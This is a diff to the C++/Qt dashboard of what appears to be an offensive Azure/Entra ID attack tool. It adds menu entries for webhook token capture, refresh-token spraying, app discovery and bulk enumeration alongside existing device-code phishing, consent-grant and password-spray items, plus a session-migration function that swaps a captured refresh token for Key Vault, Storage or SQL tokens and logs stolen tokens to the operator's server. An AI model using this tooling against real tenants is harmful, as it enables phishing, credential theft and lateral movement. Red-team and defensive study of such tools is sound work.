@@ -9,14 +9,18 @@
 // These windows need direct includes for specific constructor arguments or signals
 #include "DeviceCodeLoginWindow.h"
 #include "IllicitConsentGrant.h"
+#include "WebhookCaptureWindow.h"
 #include "CredentialLoginWindow.h"
 #include "TokenLoginWindow.h"
+#include "SPNLoginWindow.h"
 #include "SessionExportWindow.h"
 #include "SessionImportWindow.h"
 #include "ReportDialog.h"
+#include "MagicAppFinderWindow.h"
+#include "RefreshTokenSprayWindow.h"
+#include "GatherAllWindow.h"
 
 #include "../shared/SessionPersistence.h"
-#include "../server/SessionDBManager.h"
 #include "../shared/Protocol.h"
 #include "network/ClientTransport.h"
 
@@ -43,7 +47,6 @@
 #include <QShortcut>
 #include <QKeySequence>
 #include <QScreen> // To Fix window centering
-#include <QStyle>   
 #include <QJsonDocument>
 #include <QJsonObject>
 #include <QJsonArray>
@@ -54,7 +57,8 @@
 #include <QNetworkAccessManager>
 #include <QNetworkRequest>
 #include <QNetworkReply>
-#include <QUrlQuery> 
+#include <QUrlQuery>
+#include <QUuid>
 
 // Constructor
 DashboardWindow::DashboardWindow(QWidget *parent)
@@ -147,6 +151,7 @@ void DashboardWindow::initUI()
     // === Sessions menu ===
     QAction *actionNewSession  = sessionsMenu->addAction("New Session");
     QAction *accessTokenAction = sessionsMenu->addAction("New Session via Access Token");
+    QAction *spnLoginAction    = sessionsMenu->addAction("New Session via Service Principal");
     sessionsMenu->addSeparator();
 
     QAction *autoRenewAction = new QAction("Auto-Renew Tokens", this);
@@ -163,6 +168,7 @@ void DashboardWindow::initUI()
 
     connect(actionNewSession,  &QAction::triggered, this, &DashboardWindow::createNewSession);
     connect(accessTokenAction, &QAction::triggered, this, &DashboardWindow::launchAccessTokenWindow);
+    connect(spnLoginAction,    &QAction::triggered, this, &DashboardWindow::launchSPNLoginWindow);
     connect(autoRenewAction,   &QAction::toggled,   this, &DashboardWindow::toggleAutoRenew);
     connect(exportSessionsAction, &QAction::triggered, this, &DashboardWindow::openExportSessionsWindow);
     connect(importSessionsAction, &QAction::triggered, this, &DashboardWindow::openImportSessionsWindow);
@@ -170,9 +176,11 @@ void DashboardWindow::initUI()
     // === Initial Access menu ===
     QAction *deviceCodeAction     = initialAccessMenu->addAction("Device Code Phishing");
     QAction *illicitConsentAction = initialAccessMenu->addAction("Illicit Consent Grant");
+    QAction *webhookCaptureAction = initialAccessMenu->addAction("Webhook Token Capture");
 
     connect(deviceCodeAction,     &QAction::triggered, this, &DashboardWindow::launchDeviceCodeWindow);
     connect(illicitConsentAction, &QAction::triggered, this, &DashboardWindow::launchIllicitConsentWindow);
+    connect(webhookCaptureAction, &QAction::triggered, this, &DashboardWindow::launchWebhookCaptureWindow);
 
     // === Tokens menu ===
     QAction *actionOpenRefreshTokens = tokensMenu->addAction("Refresh Tokens");
@@ -182,6 +190,7 @@ void DashboardWindow::initUI()
     // === Credential Attacks menu ===
     QAction *actionPasswordSpray  = attacksMenu->addAction("Password Spray");
     QAction *actionSPNSpray       = attacksMenu->addAction("SPN Secret Spray");
+    QAction *actionRefreshSpray   = attacksMenu->addAction("Refresh Token Spray");
     QAction *actionAddAppSecret   = attacksMenu->addAction("Add App Secret");
 
     connect(actionOpenRefreshTokens, &QAction::triggered, this, &DashboardWindow::openRefreshTokensMenu);
@@ -189,9 +198,13 @@ void DashboardWindow::initUI()
     connect(ssoTokenAction,          &QAction::triggered, this, &DashboardWindow::openSsoTokenMenu);
     connect(actionPasswordSpray,     &QAction::triggered, this, &DashboardWindow::openAttackPasswordSpray);
     connect(actionSPNSpray,          &QAction::triggered, this, &DashboardWindow::openSPNSpray);
+    connect(actionRefreshSpray,      &QAction::triggered, this, &DashboardWindow::openRefreshTokenSpray);
     connect(actionAddAppSecret,      &QAction::triggered, this, &DashboardWindow::openAttackAppSecret);
 
     // === Discovery menu ===
+    QAction *actionGatherAll         = discoveryMenu->addAction("Gather All (Bulk Enum)");
+    QAction *actionMagicAppFinder    = discoveryMenu->addAction("Magic App Finder");
+    discoveryMenu->addSeparator();
     QAction *actionAzureEnum         = discoveryMenu->addAction("Subscriptions && Resources");
     QAction *actionConditionalAccess = discoveryMenu->addAction("Conditional Access Policies");
     QAction *actionCrossTenant       = discoveryMenu->addAction("Cross-Tenant Access Policies");
@@ -209,6 +222,8 @@ void DashboardWindow::initUI()
     QAction *actionFunctionApps      = discoveryMenu->addAction("Function Apps");
     QAction *actionLogicApps         = discoveryMenu->addAction("Logic Apps");
 
+    connect(actionGatherAll,         &QAction::triggered, this, &DashboardWindow::openGatherAllWindow);
+    connect(actionMagicAppFinder,    &QAction::triggered, this, &DashboardWindow::openMagicAppFinder);
     connect(actionAzureEnum,         &QAction::triggered, this, &DashboardWindow::openAzureEnumWindow);
     connect(actionConditionalAccess, &QAction::triggered, this, &DashboardWindow::openConditionalAccessWindow);
     connect(actionCrossTenant,       &QAction::triggered, this, &DashboardWindow::openCrossTenantAccessWindow);
@@ -354,6 +369,13 @@ void DashboardWindow::launchAccessTokenWindow() {
     w->show();
 }
 
+void DashboardWindow::launchSPNLoginWindow() {
+    qDebug() << "launchSPNLoginWindow()";
+    auto *w = new SPNLoginWindow(this);
+    WindowHelper::setupWindow(w, this, 420, 280, 400, 250);
+    w->show();
+}
+
 // ========== Phishing ==========
 void DashboardWindow::launchDeviceCodeWindow() {
     auto *dlg = new DeviceCodeLoginWindow(this, nullptr);
@@ -364,6 +386,12 @@ void DashboardWindow::launchDeviceCodeWindow() {
 void DashboardWindow::launchIllicitConsentWindow() {
     auto *dlg = new IllicitConsentGrant(this, nullptr);
     WindowHelper::setupWindow(dlg, this, 700, 600, 500, 400);
+    dlg->show();
+}
+
+void DashboardWindow::launchWebhookCaptureWindow() {
+    auto *dlg = new WebhookCaptureWindow(this, nullptr);
+    WindowHelper::setupWindow(dlg, this, 750, 550, 600, 450);
     dlg->show();
 }
 
@@ -387,25 +415,6 @@ void DashboardWindow::loadExistingSessions() {
     transport->sendJson(req);
 }
 
-// ============ Buttons ===========
-//void DashboardWindow::getUsers()      { qDebug() << "getUsers()"; }
-//void DashboardWindow::getGroups()     { qDebug() << "getGroups()"; }
-//void DashboardWindow::getUserRoles()  { qDebug() << "getUserRoles()"; }
-//void DashboardWindow::getContext()    { qDebug() << "getContext()"; }
-//void DashboardWindow::getAzContext()  { qDebug() << "getAzContext()"; }
-//void DashboardWindow::getCurrentUser(){ qDebug() << "getCurrentUser()"; }
-//void DashboardWindow::getTenantInfo() { qDebug() << "getTenantInfo()"; }
-//void DashboardWindow::getTokenInfo()  { qDebug() << "getTokenInfo()"; }
-
-// Session creation now happens on the server; this just opens the dialog
-/*
-void DashboardWindow::createNewSession() {
-    auto *dlg = new CredentialLoginWindow(this, nullptr);
-    dlg->setAttribute(Qt::WA_DeleteOnClose);
-    dlg->resize(300, 150);
-    dlg->show();
-}
-*/
 
 void DashboardWindow::createNewSession() {
     auto *dlg = new CredentialLoginWindow(this, nullptr);
@@ -627,6 +636,35 @@ void DashboardWindow::showSessionContextMenu(const QPoint &pos) {
 
     contextMenu.addSeparator();
 
+    // Migrate To submenu — create new session for a different resource
+    QMenu *migrateMenu = contextMenu.addMenu("Migrate To...");
+    migrateMenu->setIcon(QIcon::fromTheme("network-connect"));
+
+    struct ResourceEntry { QString label; QString url; };
+    QList<ResourceEntry> resources = {
+        {"Microsoft Graph",        "https://graph.microsoft.com"},
+        {"Azure Management",       "https://management.azure.com"},
+        {"Key Vault",              "https://vault.azure.net"},
+        {"Azure Storage",          "https://storage.azure.com"},
+        {"SQL Database",           "https://database.windows.net"},
+    };
+
+    QList<QAction*> migrateActions;
+    for (const auto &r : resources) {
+        // Skip the resource this session already has
+        if (resource.contains(r.url, Qt::CaseInsensitive)) continue;
+        QAction *a = migrateMenu->addAction(r.label + "  (" + r.url + ")");
+        a->setData(r.url);
+        migrateActions.append(a);
+    }
+
+    if (migrateMenu->isEmpty()) {
+        QAction *noOp = migrateMenu->addAction("(no other resources)");
+        noOp->setEnabled(false);
+    }
+
+    contextMenu.addSeparator();
+
     // Copy actions
     QMenu *copyMenu = contextMenu.addMenu("Copy");
     copyMenu->setIcon(QIcon::fromTheme("edit-copy"));
@@ -745,6 +783,10 @@ void DashboardWindow::showSessionContextMenu(const QPoint &pos) {
             // Remove from local state
             removeSessionById(sessionId);
         }
+    } else if (migrateActions.contains(selectedAction)) {
+        // Migrate: exchange refresh token for a new resource and create a new session
+        QString targetResource = selectedAction->data().toString();
+        migrateSession(sessionId, username, tenantId, targetResource);
     }
 }
 
@@ -817,6 +859,24 @@ void DashboardWindow::openAttackAppSecret() {
 void DashboardWindow::openSPNSpray() {
     auto *win = WindowFactory::createSPNSpraySerialWindow();
     WindowHelper::setupWindow(win, this, 800, 600, 600, 450);
+    win->show();
+}
+
+void DashboardWindow::openRefreshTokenSpray() {
+    auto *win = new RefreshTokenSprayWindow(nullptr);
+    WindowHelper::setupWindow(win, this, 900, 700, 700, 500);
+    win->show();
+}
+
+void DashboardWindow::openMagicAppFinder() {
+    auto *win = new MagicAppFinderWindow(nullptr);
+    WindowHelper::setupWindow(win, this, 900, 700, 700, 500);
+    win->show();
+}
+
+void DashboardWindow::openGatherAllWindow() {
+    auto *win = new GatherAllWindow(nullptr);
+    WindowHelper::setupWindow(win, this, 800, 700, 700, 500);
     win->show();
 }
 
@@ -913,12 +973,6 @@ void DashboardWindow::logEvent(const QString &msg) {
     eventLog->append(msg);
 }
 
-/*
-void DashboardWindow::logConnectionEvent(const QString &username, const QString &sessionId) {
-    //QString message = QString("[+] Session created for user: %1 (ID: %2)").arg(username.isEmpty() ? "Unknown" : username).arg(sessionId);
-    logEvent(message);
-}
-*/
 
 // ===============================
 // ====== Server JSON slots ======
@@ -1074,26 +1128,30 @@ void DashboardWindow::setTransport(ClientTransport* t)
                      Qt::UniqueConnection);
 
     // Log exchanged tokens to the server when TokenHelper re-exchanges with a new client ID
-    connect(TokenHelper::instance(), &TokenHelper::tokenExchanged, this,
-        [this](const QString &accessToken, const QString &refreshToken,
-               const QString &upn, const QString &tenantId, const QString &resource) {
-            if (!transport) return;
-            QJsonObject req;
-            req.insert(Protocol::F_ACTION, Protocol::ACTION_LOG_TOKEN);
-            req.insert("sessionId", QString("%1_%2").arg(upn, resource));
-            req.insert("source", "auto_client_exchange");
-            req.insert("accessToken", accessToken);
-            if (!refreshToken.isEmpty())
-                req.insert("refreshToken", refreshToken);
-            if (!upn.isEmpty())
-                req.insert("user", upn);
-            if (!tenantId.isEmpty())
-                req.insert("tenantId", tenantId);
-            if (!resource.isEmpty())
-                req.insert("resource", resource);
-            transport->sendJson(req);
-            logEvent(QString("[Token] Exchanged token for %1 → %2").arg(upn, resource));
-        }, Qt::UniqueConnection);
+    // Note: Can't use Qt::UniqueConnection with lambdas, so we use a flag instead
+    if (!tokenHelperConnected) {
+        connect(TokenHelper::instance(), &TokenHelper::tokenExchanged, this,
+            [this](const QString &accessToken, const QString &refreshToken,
+                   const QString &upn, const QString &tenantId, const QString &resource) {
+                if (!transport) return;
+                QJsonObject req;
+                req.insert(Protocol::F_ACTION, Protocol::ACTION_LOG_TOKEN);
+                req.insert("sessionId", QString("%1_%2").arg(upn, resource));
+                req.insert("source", "auto_client_exchange");
+                req.insert("accessToken", accessToken);
+                if (!refreshToken.isEmpty())
+                    req.insert("refreshToken", refreshToken);
+                if (!upn.isEmpty())
+                    req.insert("user", upn);
+                if (!tenantId.isEmpty())
+                    req.insert("tenantId", tenantId);
+                if (!resource.isEmpty())
+                    req.insert("resource", resource);
+                transport->sendJson(req);
+                logEvent(QString("[Token] Exchanged token for %1 → %2").arg(upn, resource));
+            });
+        tokenHelperConnected = true;
+    }
 
     // Pull the initial list
     loadExistingSessions();
@@ -1529,6 +1587,79 @@ void DashboardWindow::autoSaveSession(const QString &sessionId) {
 }
 
 // -----------------------------------------------------------------------------
+// Session Migration (token exchange to a different resource)
+// -----------------------------------------------------------------------------
+void DashboardWindow::migrateSession(const QString &sourceSessionId, const QString &username,
+                                      const QString &tenantId, const QString &targetResource)
+{
+    // Derive label for log messages
+    QString label = targetResource;
+    if (label.contains("graph.microsoft.com"))    label = "Microsoft Graph";
+    else if (label.contains("management.azure.com")) label = "Azure Management";
+    else if (label.contains("vault.azure.net"))    label = "Key Vault";
+    else if (label.contains("storage.azure.com"))  label = "Azure Storage";
+    else if (label.contains("database.windows.net")) label = "SQL Database";
+
+    logEvent(QString("[*] Migrating session %1 (%2) to %3...")
+             .arg(sourceSessionId.left(8), username, label));
+
+    // Look for a refresh token from this session or user
+    QString refreshToken, rtTenantId, rtUpn;
+    bool hasRT = TokenHelper::instance()->getBestRefreshToken(refreshToken, rtTenantId, rtUpn, username);
+    if (!hasRT) {
+        logEvent(QString("[-] No refresh token available for %1 — cannot migrate").arg(username));
+        QMessageBox::warning(this, "Migration Failed",
+            QString("No refresh token is available for user '%1'.\n\n"
+                    "Migration requires a refresh token to exchange for a new resource token. "
+                    "Sessions created via access-token-only or SPN login may not have one.")
+            .arg(username));
+        return;
+    }
+
+    // Use the tenant from the refresh token if the session tenant is generic
+    QString effectiveTenant = rtTenantId.isEmpty() ? tenantId : rtTenantId;
+
+    // Exchange the refresh token for the target resource
+    TokenHelper::instance()->exchangeRefreshToken(
+        refreshToken, effectiveTenant, targetResource,
+        [this, sourceSessionId, username, effectiveTenant, targetResource, label]
+        (bool success, const QString &accessToken, const QString &error) {
+
+            if (!success) {
+                logEvent(QString("[-] Migration failed: %1").arg(error));
+                QMessageBox::critical(this, "Migration Failed",
+                    QString("Could not obtain a %1 token:\n\n%2").arg(label, error));
+                return;
+            }
+
+            logEvent(QString("[+] Acquired %1 token, creating new session...").arg(label));
+
+            // Send new_session with the exchanged token
+            if (!transport) {
+                logEvent("[-] No server connection");
+                return;
+            }
+
+            QString rid = QUuid::createUuid().toString(QUuid::WithoutBraces);
+            QString domain = username.contains('@') ? username.section('@', 1, 1) : QStringLiteral("N/A");
+
+            QJsonObject req;
+            req.insert(Protocol::F_ACTION, Protocol::ACTION_NEW_SESSION);
+            req.insert("mode",         QStringLiteral("tokens"));
+            req.insert("accessToken",  accessToken);
+            req.insert("resource",     targetResource);
+            req.insert("user",         username);
+            req.insert("tenantId",     effectiveTenant);
+            req.insert("domain",       domain);
+            req.insert("rid",          rid);
+
+            transport->sendJson(req);
+
+            // The normal onServerJson handler will pick up session_created
+            logEvent(QString("[*] Migration request sent (RID: %1)").arg(rid.left(8)));
+        });
+}
+
 // Session Export/Import Windows
 // -----------------------------------------------------------------------------
 void DashboardWindow::openExportSessionsWindow() {
